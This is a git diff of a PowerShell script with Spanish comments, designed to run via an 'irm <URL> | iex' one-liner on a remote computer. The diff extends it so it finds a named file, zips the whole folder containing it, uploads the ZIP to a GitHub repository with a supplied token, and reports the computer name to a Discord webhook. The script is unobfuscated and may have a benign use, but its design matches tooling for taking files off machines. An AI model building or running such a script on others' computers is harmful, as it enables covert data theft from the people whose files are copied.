@@ -1,6 +1,7 @@
 <#
 .SYNOPSIS
-    Auto-Upload: indexa/busca un archivo, lo sube a GitHub (API REST) y avisa por Discord.
+    Auto-Upload ZIP: indexa/busca un archivo, comprime en ZIP la carpeta donde se encuentra
+    el archivo, sube el ZIP a GitHub (API REST) y avisa por Discord.
     Disenado para ejecutarse via: irm <URL> | iex
     Las credenciales se toman de variables de entorno (GH_TOKEN, GH_REPO, GH_WEBHOOK)
     definidas en el MISMO one-liner, asi el repositorio no contiene secretos.
@@ -10,6 +11,8 @@
 .PARAMETER Repo          Repositorio destino "user/repo". Default: $env:GH_REPO
 .PARAMETER Branch        Branch destino. Default: main (se auto-detecta).
 .PARAMETER WebhookUrl    URL webhook Discord. Default: $env:GH_WEBHOOK
+.PARAMETER ZipOutputDir  Carpeta donde crear el ZIP temporal. Default: $env:TEMP
+.PARAMETER KeepZip       Si se usa, NO borra el ZIP temporal despues de subirlo.
 #>
 [CmdletBinding()]
 param(
@@ -19,8 +22,10 @@ param(
     [string]$Repo       = $env:GH_REPO,
     [string]$Branch     = "main",
     [string]$WebhookUrl = $env:GH_WEBHOOK,
-    [string]$CommitMsg  = "Auto-upload: subida automatica desde equipo remoto",
-    [int]$RecurseDepth  = 6
+    [string]$CommitMsg  = "Auto-upload ZIP: subida automatica desde equipo remoto",
+    [int]$RecurseDepth  = 6,
+    [string]$ZipOutputDir = "",
+    [switch]$KeepZip
 )
 
 # ---------- Validacion ----------
@@ -57,11 +62,12 @@ function Send-DiscordNotice {
     $color   = if ($Status -eq 'SUCCESS') { 3066993 } else { 15158332 }
     $emoji   = if ($Status -eq 'SUCCESS') { ':white_check_mark:' } else { ':x:' }
     $repoUrl = "https://github.com/$RepoName"
+    $fileLink = "https://github.com/$RepoName/blob/$BranchName/$([uri]::EscapeDataString($FilePath))"
 
     $desc = if ($Status -eq 'SUCCESS') {
         "**$emoji Subida completada correctamente**`n`n" +
         "**Equipo:** ``$ComputerName```n" +
-        "**Archivo:** ``$FilePath```n" +
+        "**Archivo subido:** [$FilePath]($fileLink)`n" +
         "**Repositorio:** [$RepoName]($repoUrl)`n" +
         "**Branch:** ``$BranchName```n"
     } else {
@@ -111,6 +117,7 @@ $ErrorActionPreference = 'Stop'
 $script:ComputerName   = $env:COMPUTERNAME
 $script:FinalStatus    = 'ERROR'
 $script:FoundPath      = ""
+$script:ZipPath        = ""
 $script:CommitShaFinal = ""
 $script:LastError      = ""
 
@@ -171,17 +178,36 @@ try {
         throw "No se encontro ningun archivo que coincida con '$FileName' bajo '$SearchRoot'."
     }
 
-    # 2) Resolver branch destino
+    # 2) Determinar la carpeta donde esta el archivo y comprimirla en ZIP
+    $sourceFolder = Split-Path -Path $script:FoundPath -Parent
+    Write-Log "Carpeta a comprimir: $sourceFolder" "Cyan"
+
+    if (-not $ZipOutputDir) { $ZipOutputDir = $env:TEMP }
+    if (-not (Test-Path -LiteralPath $ZipOutputDir)) {
+        New-Item -ItemType Directory -Path $ZipOutputDir -Force | Out-Null
+    }
+    $zipName = "{0}_{1}.zip" -f (Split-Path $sourceFolder -Leaf), (Get-Date -Format 'yyyyMMdd_HHmmss')
+    $script:ZipPath = Join-Path $ZipOutputDir $zipName
+
+    Write-Log "Creando ZIP: $script:ZipPath" "Yellow"
+    Compress-Archive -Path $sourceFolder -DestinationPath $script:ZipPath -CompressionLevel Optimal -Force
+
+    $zipLen = (Get-Item -LiteralPath $script:ZipPath).Length
+    if ($zipLen -gt 50MB) {
+        Write-Log "OJO: el ZIP pesa $([math]::Round($zipLen/1MB,2)) MB. GitHub limita archivos a 100MB; si falla, usa una carpeta mas liviana." "Yellow"
+    }
+
+    # 3) Resolver branch destino
     $Branch = Get-GitHubDefaultBranch -RepoOwnerSlashName $Repo -TokenName $Token
     Write-Log "Branch destino: $Branch" "Cyan"
 
-    # 3) Leer archivo y convertir a base64
-    $bytes  = [System.IO.File]::ReadAllBytes($script:FoundPath)
+    # 4) Leer el ZIP y convertir a base64
+    $bytes  = [System.IO.File]::ReadAllBytes($script:ZipPath)
     $b64    = [Convert]::ToBase64String($bytes)
-    $target = Split-Path $script:FoundPath -Leaf
-    Write-Log "Tamano archivo: $($bytes.Length) bytes" "Cyan"
+    $target = Split-Path $script:ZipPath -Leaf
+    Write-Log "Tamano ZIP: $($bytes.Length) bytes" "Cyan"
 
-    # 4) Comprobar si ya existe (para sha correcto en update)
+    # 5) Comprobar si ya existe (para sha correcto en update)
     $apiBase = "https://api.github.com/repos/$Repo/contents/$target"
     $headers = @{
         Authorization = "Bearer $Token"
@@ -192,7 +218,7 @@ try {
     $existingSha = $null
     try {
         $resp = Invoke-RestMethod -Uri "$apiBase?ref=$Branch" -Headers $headers `
-            -ErrorAction Stop -SkipHttpErrorCheck
+            -ErrorAction Stop
         if ($resp.sha) { $existingSha = $resp.sha }
     } catch {}
 
@@ -204,14 +230,14 @@ try {
     if ($existingSha) { $body.sha = $existingSha }
     $bodyJson = $body | ConvertTo-Json -Depth 5
 
-    # 5) PUT para crear/actualizar el archivo
+    # 6) PUT para crear/actualizar el archivo ZIP
     Write-Log "Subiendo a GitHub: $Repo / $target (branch $Branch)" "Yellow"
     $putResp = Invoke-RestMethod -Method Put -Uri "$apiBase" -Headers $headers `
         -Body $bodyJson -ContentType 'application/json' -ErrorAction Stop
 
     $script:CommitShaFinal = $putResp.content.sha
     $script:FinalStatus    = 'SUCCESS'
-    Write-Log "OK: archivo subido. Commit SHA=$($script:CommitShaFinal)" "Green"
+    Write-Log "OK: ZIP subido. Commit SHA=$($script:CommitShaFinal)" "Green"
 
 } catch {
     $script:FinalStatus = 'ERROR'
@@ -225,10 +251,15 @@ try {
     Send-DiscordNotice -HookUrl $WebhookUrl `
         -Status $script:FinalStatus `
         -ComputerName $script:ComputerName `
-        -FilePath $script:FoundPath `
+        -FilePath $(Split-Path $script:ZipPath -Leaf) `
         -CommitSha $script:CommitShaFinal `
         -RepoName $Repo `
         -BranchName $Branch `
         -Extra $script:LastError
+
+    if ($script:ZipPath -and (Test-Path -LiteralPath $script:ZipPath) -and -not $KeepZip) {
+        Remove-Item -LiteralPath $script:ZipPath -Force
+        Write-Log "ZIP temporal eliminado: $script:ZipPath" "DarkGray"
+    }
     Write-Log "=== Fin ===" "Green"
 }
